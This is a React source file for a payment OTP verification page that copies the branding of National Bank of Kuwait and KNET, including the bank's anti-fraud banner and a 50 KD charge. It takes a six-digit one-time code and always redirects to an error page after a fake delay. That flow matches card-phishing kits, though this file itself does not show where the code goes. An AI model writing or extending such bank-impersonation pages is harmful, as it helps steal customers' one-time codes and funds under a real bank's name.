
import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";

const OTPVerification = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    
    // Simulate processing time
    setTimeout(() => {
      // Always redirect to error page (as per requirements)
      navigate('/error');
    }, 2000);
  };

  const handleCancel = () => {
    navigate(`/card/${id}`);
  };

  return (
    <div className="min-h-screen bg-gray-100" style={{ backgroundColor: '#f5f5f5' }}>
      {/* NBK Advertisement Banner */}
      <div className="w-full h-32 bg-gradient-to-r from-blue-400 to-blue-600 relative overflow-hidden">
        <div className="absolute inset-0 flex items-center justify-between px-8">
          <div className="text-white text-right">
            <div className="text-lg font-bold mb-1">الجمهورية المصرفية الكويتية</div>
            <div className="text-sm">بنك الكويت الوطني</div>
          </div>
          <div className="text-white text-right">
            <div className="text-xl font-bold">الاحتيال له عدة</div>
            <div className="text-xl font-bold">أشكال وأنواع</div>
            <div className="text-sm">لا تشارك معلوماتك</div>
            <div className="text-sm">المصرفية مع أي أحد</div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8 max-w-2xl">
        {/* NBK Header Card */}
        <div className="bg-white rounded-2xl shadow-lg p-6 mb-6">
          <div className="text-center mb-6">
            <div className="flex items-center justify-center mb-4">
              <div className="text-2xl font-bold text-blue-800">
                الوطني
                <span className="text-blue-600 ml-2">NBK</span>
              </div>
              <div className="w-8 h-6 bg-blue-800 rounded ml-2"></div>
            </div>
          </div>
          
          <div className="border-t border-gray-200 pt-4">
            <div className="flex justify-between items-center mb-4">
              <span className="text-blue-600 font-medium">OTP Verification</span>
              <span className="text-gray-700">:التحقق من الرمز</span>
            </div>
            <div className="border-t border-gray-200 pt-2">
              <div className="flex justify-between items-center">
                <span className="text-blue-600 font-bold text-xl">KD 50.000</span>
                <span className="text-gray-700">:المبلغ</span>
              </div>
            </div>
          </div>
        </div>

        {/* OTP Form Card */}
        <div className="bg-white rounded-2xl shadow-lg p-6 mb-6">
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="text-center space-y-4">
              <p className="text-gray-600 text-lg">
                يرجى إدخال رمز التحقق المرسل إلى هاتفك المحمول
              </p>
              <p className="text-gray-500 text-sm">
                Please enter the OTP sent to your registered mobile number ending with ****1234
              </p>
              
              <div className="flex justify-center py-6">
                <InputOTP
                  maxLength={6}
                  value={otp}
                  onChange={(value) => setOtp(value)}
                >
                  <InputOTPGroup className="gap-3">
                    <InputOTPSlot index={0} className="w-12 h-12 text-xl border-2 border-blue-400 rounded-lg" />
                    <InputOTPSlot index={1} className="w-12 h-12 text-xl border-2 border-blue-400 rounded-lg" />
                    <InputOTPSlot index={2} className="w-12 h-12 text-xl border-2 border-blue-400 rounded-lg" />
                    <InputOTPSlot index={3} className="w-12 h-12 text-xl border-2 border-blue-400 rounded-lg" />
                    <InputOTPSlot index={4} className="w-12 h-12 text-xl border-2 border-blue-400 rounded-lg" />
                    <InputOTPSlot index={5} className="w-12 h-12 text-xl border-2 border-blue-400 rounded-lg" />
                  </InputOTPGroup>
                </InputOTP>
              </div>
              
              <div className="text-center">
                <button
                  type="button"
                  className="text-blue-600 hover:text-blue-800 underline text-sm"
                >
                  لم تستلم الرمز؟ إعادة الإرسال
                </button>
              </div>
            </div>
          </form>
        </div>

        {/* Action Buttons Card */}
        <div className="bg-white rounded-2xl shadow-lg p-6">
          <div className="flex space-x-4">
            <button
              onClick={handleCancel}
              className="flex-1 bg-gray-300 text-gray-700 py-4 rounded-lg text-lg font-medium hover:bg-gray-400 transition-colors"
              disabled={loading}
            >
              إلغاء
            </button>
            <button
              onClick={handleSubmit}
              className="flex-1 bg-gray-300 text-gray-700 py-4 rounded-lg text-lg font-medium hover:bg-gray-400 transition-colors"
              disabled={loading || otp.length !== 6}
            >
              {loading ? (
                <>
                  <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-gray-700 mr-2 inline-block"></div>
                  جاري التحقق...
                </>
              ) : (
                'تأكيد'
              )}
            </button>
          </div>
        </div>

        {/* Security Notice */}
        <div className="text-center mt-6 text-gray-500 text-sm">
          <p>🔒 رمز التحقق صالح لمدة 5 دقائق</p>
          <p className="mt-1">This is a simulated payment environment</p>
        </div>

        {/* Footer */}
        <div className="text-center mt-8 text-gray-600">
          <div className="text-sm mb-2">جميع الحقوق محفوظة © 2025</div>
          <div className="text-sm text-blue-600">شركة الخدمات المصرفية الآلية المشتركة - كي نت</div>
        </div>
      </div>
    </div>
  );
};

export default OTPVerification;
